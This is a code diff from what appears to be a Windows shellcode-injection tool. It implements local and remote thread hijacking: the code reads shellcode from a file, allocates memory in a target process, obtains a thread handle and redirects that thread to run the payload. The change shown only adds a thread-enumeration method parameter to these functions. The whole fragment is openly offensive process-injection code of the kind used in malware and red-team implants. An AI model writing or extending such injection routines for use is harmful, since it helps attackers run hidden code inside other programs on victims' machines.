@@ -20,7 +20,7 @@ BOOL LocalThreadHijacking(IN LPCSTR lpShellcodePath, IN DWORD dwMainThreadId)
 	if (!AllocateMemory(NULL, pShellcode, sShellcodeSize, &pShellcodeAddr))
 		return FALSE;
 
-	if (!ObtainThreadHandle(NULL, dwMainThreadId, &hThread, &dwThreadId))
+	if (!ObtainThreadHandle(NULL, NULL, dwMainThreadId, &hThread, &dwThreadId))
 		return FALSE;
 
 	if (!HijackThread(hThread, pShellcodeAddr))
@@ -34,7 +34,7 @@ BOOL LocalThreadHijacking(IN LPCSTR lpShellcodePath, IN DWORD dwMainThreadId)
 	CloseHandle(hThread);
 }
 
-BOOL RemoteThreadHijacking(IN LPCSTR lpProcessName, IN LPCSTR lpShellcodePath)
+BOOL RemoteThreadHijacking(IN LPCSTR lpProcessName, IN DWORD dwThreadEnumerationMethod, IN LPCSTR lpShellcodePath)
 {
 	PVOID pShellcode = NULL, pShellcodeAddr = NULL;
 	SIZE_T sShellcodeSize;
@@ -50,7 +50,7 @@ BOOL RemoteThreadHijacking(IN LPCSTR lpProcessName, IN LPCSTR lpShellcodePath)
 	if (!AllocateMemory(hProcess, pShellcode, sShellcodeSize, &pShellcodeAddr))
 		return FALSE;
 
-	if (!ObtainThreadHandle(dwProcessId, NULL, &hThread, &dwThreadId))
+	if (!ObtainThreadHandle(dwThreadEnumerationMethod, dwProcessId, NULL, &hThread, &dwThreadId))
 		return FALSE;
 
 	if (!HijackThread(hThread, pShellcodeAddr))
